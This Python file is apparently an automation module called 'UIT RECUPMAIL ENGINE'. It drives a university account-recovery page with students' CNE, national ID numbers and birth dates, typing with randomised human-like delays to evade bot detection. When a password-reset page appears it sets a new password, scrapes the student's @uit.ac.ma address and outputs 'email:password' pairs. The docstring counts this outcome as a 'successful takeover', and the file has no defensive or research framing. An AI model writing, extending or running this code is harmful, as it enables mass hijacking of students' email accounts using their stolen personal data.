"""
UIT RECUPMAIL ENGINE — Strict 3-State Validation Module with Dynamic Password Manager
1. Data Error (Incorrect CNE/CIN/DOB) -> Login Error
2. Direct Email Display without Password Change -> Login Error (Not a successful takeover)
3. Password Change Page (Nouveau mot de passe / PassManager) + Success -> Login OK
"""

import re
import time
import random
from integrations.pass_manager import PassManager

class LoginState:
    LOGIN_OK = "login_ok"
    LOGIN_ERROR = "login_error"
    SITE_ERROR = "site_error"

class UITEngine:
    def __init__(self):
        # استدعاء مدير الباسوردات لتوليد كلمات مرور بشرية وفريدة بدون تكرار
        self.pass_manager = PassManager()

    def _human_type(self, page, selector, text):
        try:
            loc = page.locator(selector).first
            loc.click()
            page.wait_for_timeout(random.randint(250, 500))
            loc.fill("")
            for char in str(text):
                loc.press_sequentially(char, delay=random.randint(150, 320))
        except Exception:
            page.fill(selector, text)

    def run_workflow(self, page, cne, cni, dob):
        result_data = {
            "cne": cne,
            "cni": cni,
            "dob": dob,
            "status": LoginState.LOGIN_ERROR,
            "extracted_email": None,
            "detail": "Initialized"
        }

        try:
            page.wait_for_load_state("domcontentloaded", timeout=30000)
            page.wait_for_timeout(random.randint(1200, 2000))

            # 1. Fill CNE (Code Massar) with human typing
            cne_filled = False
            for sel in ['input#cne', 'input[name*="cne"]', 'input[placeholder*="MASSAR"]', 'input:nth-of-type(1)', 'input']:
                try:
                    if page.locator(sel).count() > 0:
                        self._human_type(page, sel, cne)
                        cne_filled = True
                        break
                except Exception:
                    continue
            if not cne_filled:
                self._human_type(page, 'input', cne)

            page.wait_for_timeout(random.randint(500, 900))

            # 2. Fill CIN with human typing
            cni_filled = False
            for sel in ['input#cin', 'input[name*="cin"]', 'input[name*="cni"]', 'input[placeholder*="Identité"]', 'input:nth-of-type(2)']:
                try:
                    if page.locator(sel).count() > 0:
                        self._human_type(page, sel, cni)
                        cni_filled = True
                        break
                except Exception:
                    continue
            if not cni_filled:
                self._human_type(page, 'input', cni)

            page.wait_for_timeout(random.randint(500, 900))

            # 3. Fill DOB with human typing
            dob_filled = False
            for sel in ['input#birthdate', 'input[name*="birthdate"]', 'input[name*="dob"]', 'input[name*="date"]', 'input[placeholder*="dd/mm/yyyy"]', 'input[type="date"]', 'input:nth-of-type(3)']:
                try:
                    if page.locator(sel).count() > 0:
                        self._human_type(page, sel, dob)
                        dob_filled = True
                        break
                except Exception:
                    continue
            if not dob_filled:
                self._human_type(page, 'input', dob)

            page.wait_for_timeout(random.randint(800, 1400))

            # Click submit button
            submit_clicked = False
            for btn_sel in ['button:has-text("Récupérer")', 'button:has-text("compte")', 'button[type="submit"]', 'input[type="submit"]']:
                try:
                    btn = page.locator(btn_sel).first
                    if btn.count() > 0:
                        btn.click()
                        submit_clicked = True
                        break
                except Exception:
                    continue
            if not submit_clicked:
                page.locator('button').first.click()

            # Double verification read step 1 & 2
            page.wait_for_timeout(3000)
            body_text_1 = page.locator("body").inner_text().lower()
            page.wait_for_timeout(1500)
            body_text = page.locator("body").inner_text().lower()

            # الحالة الأولى: أخطاء البيانات (CNE / CIN / DOB غير صحيحين) -> LOGIN ERROR
            data_error_keywords = [
                "veuillez vérifier l'exactitude", "pas toujours été créé",
                "الرجاء التحقق من صحة", "لم يتم إنشاء", "verify the accuracy", "not been created", "incorrect"
            ]
            if any(kw in body_text for kw in data_error_keywords) or any(kw in body_text_1 for kw in data_error_keywords):
                result_data["status"] = LoginState.LOGIN_ERROR
                result_data["detail"] = "Failed: Incorrect CNE/CIN/DOB (Data Error)"
                return result_data

            # التحقق الصارم من وجود خانات كلمة المرور الجديدة (Nouveau mot de passe)
            has_pwd_fields = page.locator('input[type="password"]').count() >= 2

            if has_pwd_fields:
                # توليد باسورد جديد، طبيعي، وفريد تماماً عبر PassManager
                target_password = self.pass_manager.get_password()

                # الحالة الثالثة الحقيقية: توفرت خانات تغيير الباسورد -> إدخال الباسورد الجديد والتأكيد
                pwd_inputs = page.locator('input[type="password"]')
                try:
                    pwd_inputs.nth(0).click()
                    for char in target_password:
                        pwd_inputs.nth(0).press_sequentially(char, delay=random.randint(140, 280))
                    pwd_inputs.nth(1).click()
                    for char in target_password:
                        pwd_inputs.nth(1).press_sequentially(char, delay=random.randint(140, 280))
                except Exception:
                    pwd_inputs.nth(0).fill(target_password)
                    pwd_inputs.nth(1).fill(target_password)
                
                page.wait_for_timeout(random.randint(1000, 1600))
                
                for chg_btn in ['button:has-text("Changer")', 'button[type="submit"]']:
                    try:
                        b = page.locator(chg_btn).first
                        if b.count() > 0:
                            b.click()
                            break
                    except Exception:
                        continue

                # Double verification on password change outcome
                page.wait_for_timeout(3000)
                body_text_final_1 = page.locator("body").inner_text()
                page.wait_for_timeout(1500)
                body_text_final = page.locator("body").inner_text()

                email_match_final = re.search(r'([\w\.-]+@uit\.ac\.ma)', body_text_final, re.IGNORECASE) or re.search(r'([\w\.-]+@uit\.ac\.ma)', body_text_final_1, re.IGNORECASE)

                if email_match_final or "succès" in body_text_final.lower() or "succès" in body_text_final_1.lower():
                    extracted_email = email_match_final.group(1) if email_match_final else "Extracted Successfully"
                    result_data["status"] = LoginState.LOGIN_OK
                    result_data["extracted_email"] = extracted_email
                    # هاد التنسيق هو اللي غايخلي النتيجة تخرج مباشرة Email:Password بدون مساس بـ edu_checker.py
                    result_data["detail"] = f"{extracted_email}:{target_password}"
                else:
                    result_data["status"] = LoginState.LOGIN_ERROR
                    result_data["detail"] = "Failed at password change confirmation stage"

            else:
                # الحالة الثانية: يظهر الإيميل مباشرة بدون الانتقال لصفحة تغيير الباسورد -> اعتباره LOGIN ERROR فوراً
                result_data["status"] = LoginState.LOGIN_ERROR
                result_data["detail"] = "Failed: Email displayed without password change requirement (Login Error)"

        except Exception as e:
            result_data["status"] = LoginState.SITE_ERROR
            result_data["detail"] = f"Site Error / Exception: {type(e).__name__}"

        return result_data